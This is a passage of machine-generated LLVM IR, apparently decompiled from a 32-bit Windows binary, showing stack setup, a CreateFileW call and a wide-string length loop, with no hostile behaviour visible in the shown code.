  %828 = add i32 %esp.3.reload, -24, !insn.addr !1390
  %829 = inttoptr i32 %828 to i32*, !insn.addr !1390
  store i32 4, i32* %829, align 4, !insn.addr !1390
  %830 = add i32 %esp.3.reload, -28, !insn.addr !1391
  %831 = inttoptr i32 %830 to i32*, !insn.addr !1391
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %831, align 4, !insn.addr !1391
  store i128 4522075, i128* %stack_var_-108, align 8, !insn.addr !1392
  %832 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1393
  %833 = ptrtoint i32* %832 to i32, !insn.addr !1393
  store i32 %833, i32* @global_var_1003e9c0, align 4, !insn.addr !1394
  store i32 %34, i32* %ecx.12.reg2mem, !insn.addr !1395
  br label %dec_label_pc_10003305, !insn.addr !1395

dec_label_pc_10003305:                            ; preds = %dec_label_pc_10003305, %dec_label_pc_100032c6
  %ecx.12.reload = load i32, i32* %ecx.12.reg2mem
  %834 = inttoptr i32 %ecx.12.reload to i16*, !insn.addr !1396
  %835 = load i16, i16* %834, align 2, !insn.addr !1396
  %836 = add i32 %ecx.12.reload, 2, !insn.addr !1397
  %837 = icmp eq i16 %835, 0, !insn.addr !1398
  %838 = icmp eq i1 %837, false, !insn.addr !1399
  store i32 %836, i32* %ecx.12.reg2mem, !insn.addr !1399
  store i32 %836, i32* %.pn.reg2mem, !insn.addr !1399
  store i32 %833, i32* %edx.6.reg2mem, !insn.addr !1399
  store i32 %830, i32* %esp.4.reg2mem, !insn.addr !1399
  br i1 %838, label %dec_label_pc_10003305, label %dec_label_pc_10003473, !insn.addr !1399

dec_label_pc_1000331b:                            ; preds = %dec_label_pc_10002c24
  %839 = add i32 %esp.3.reload, -4, !insn.addr !1400
  %840 = inttoptr i32 %839 to i32*, !insn.addr !1400
  store i32 0, i32* %840, align 4, !insn.addr !1400
  %841 = add i32 %esp.3.reload, -8, !insn.addr !1401
  %842 = inttoptr i32 %841 to i32*, !insn.addr !1401
  store i32 128, i32* %842, align 4, !insn.addr !1401
  %843 = add i32 %esp.3.reload, -12, !insn.addr !1402
  %844 = inttoptr i32 %843 to i32*, !insn.addr !1402
  store i32 4, i32* %844, align 4, !insn.addr !1402
  %845 = add i32 %esp.3.reload, -16, !insn.addr !1403
  %846 = inttoptr i32 %845 to i32*, !insn.addr !1403
  store i32 0, i32* %846, align 4, !insn.addr !1403
  %847 = add i32 %esp.3.reload, -20, !insn.addr !1404
  %848 = inttoptr i32 %847 to i32*, !insn.addr !1404
  store i32 1, i32* %848, align 4, !insn.addr !1404
  %849 = add i32 %esp.3.reload, -24, !insn.addr !1405
  %850 = inttoptr i32 %849 to i32*, !insn.addr !1405
  store i32 4, i32* %850, align 4, !insn.addr !1405
